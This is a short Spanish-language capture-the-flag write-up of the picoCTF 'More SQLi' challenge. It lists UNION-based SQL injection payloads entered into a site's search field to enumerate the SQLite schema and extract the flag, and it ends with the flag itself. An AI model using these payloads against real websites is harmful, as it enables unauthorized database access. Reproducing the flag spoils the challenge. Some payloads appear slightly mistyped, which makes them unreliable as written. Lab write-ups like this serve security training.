# More SQLi

## Description

Can you find the flag on this website.

Additional details will be available after launching your challenge instance.

Can you find the flag on this website.Try to find the flag [here](http://saturn.picoctf.net:51946/).

This challenge launches an instance on demand.  
Its current status is: `RUNNING`

Instance Time Remaining: `14`
## Hints 1

* SQLiLite

## Solución

Una vez iniciada la instancia, ingresamos al link proporcionado en el cual nos pide un usuario y contraseña y como anteriormente hemos visto no podemos ingresar, por lo tanto en el **"Serach"**
ingresamos varias combinaciones para encontrar nuestra flag, al final la correcta fue la ultima:

```
' union select 1,2,3'

' union select sqlite_version(),2,3'

' union select sq1,2,3 from sqlite_master'

' union select id, flag from more_table; <-- Este comando fue el que nos mostro nuestra flag.

```

Y damos enter al escribir la ultima combinación y con esto nos muestra nuestra respectiva flag:
![[Pasted image 20250331123822.png]]
### Respuesta: picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_98236ce6}